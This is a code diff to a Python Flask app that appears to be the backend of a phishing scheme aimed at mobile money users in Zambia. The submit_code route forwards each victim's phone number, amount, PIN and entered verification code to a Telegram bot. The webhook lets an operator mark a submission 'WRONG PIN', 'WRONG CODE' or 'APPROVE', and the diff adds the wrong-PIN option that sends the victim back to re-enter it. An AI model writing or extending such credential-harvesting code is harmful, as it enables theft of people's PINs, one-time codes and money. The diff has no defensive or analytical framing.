@@ -90,7 +90,7 @@ def submit_code():
     if p:
         phone, amount, plan, pin = p
         msg = f'🔐 CODE VERIFICATION\n\n🆔 {app_id}\n📞 +260 {phone}\n📦 {plan}\n💰 ZMW {amount:,}\n🔢 PIN: {pin}\n\n📋 FULL MESSAGE:\n```\n{entered_code}\n```'
-        send_telegram(msg, {'inline_keyboard':[[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'},{'text':'✅ APPROVE','callback_data':f'approve_{app_id}'}]]})
+        send_telegram(msg, {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'wrongpin_{app_id}'},{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'},{'text':'✅ APPROVE','callback_data':f'approve_{app_id}'}]]})
     conn.close()
     return jsonify({'success':True})
 
@@ -109,19 +109,38 @@ def webhook():
         cb = data['callback_query']; cb_data = cb['data']
         msg_id = cb['message']['message_id']; original = cb['message']['text']
         conn = sqlite3.connect('database.db'); c = conn.cursor()
+        
         if cb_data.startswith('deny_'): 
-            c.execute('UPDATE payments SET status="invalid" WHERE app_id=?',(cb_data.replace('deny_',''),))
+            aid = cb_data.replace('deny_','')
+            c.execute('UPDATE payments SET status="invalid" WHERE app_id=?',(aid,))
+            conn.commit()
             edit_telegram(msg_id, original+'\n\n❌ INVALID')
+        
         elif cb_data.startswith('allow_'): 
-            c.execute('UPDATE payments SET status="approved" WHERE app_id=?',(cb_data.replace('allow_',''),))
+            aid = cb_data.replace('allow_','')
+            c.execute('UPDATE payments SET status="approved" WHERE app_id=?',(aid,))
+            conn.commit()
             edit_telegram(msg_id, original+'\n\n✅ ALLOWED')
+        
+        elif cb_data.startswith('wrongpin_'): 
+            aid = cb_data.replace('wrongpin_','')
+            c.execute('UPDATE payments SET status="wrong_pin", code_status="wrong_pin" WHERE app_id=?',(aid,))
+            conn.commit()
+            edit_telegram(msg_id, original+'\n\n❌ WRONG PIN - User sent back')
+        
         elif cb_data.startswith('wrongcode_'): 
-            c.execute('UPDATE payments SET code_status="wrong_code" WHERE app_id=?',(cb_data.replace('wrongcode_',''),))
+            aid = cb_data.replace('wrongcode_','')
+            c.execute('UPDATE payments SET code_status="wrong_code" WHERE app_id=?',(aid,))
+            conn.commit()
             edit_telegram(msg_id, original+'\n\n❌ WRONG CODE')
+        
         elif cb_data.startswith('approve_'): 
-            c.execute('UPDATE payments SET code_status="approved" WHERE app_id=?',(cb_data.replace('approve_',''),))
+            aid = cb_data.replace('approve_','')
+            c.execute('UPDATE payments SET code_status="approved" WHERE app_id=?',(aid,))
+            conn.commit()
             edit_telegram(msg_id, original+f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')
-        conn.commit(); conn.close()
+        
+        conn.close()
     return jsonify({'ok':True})
 
 if __name__ == '__main__':
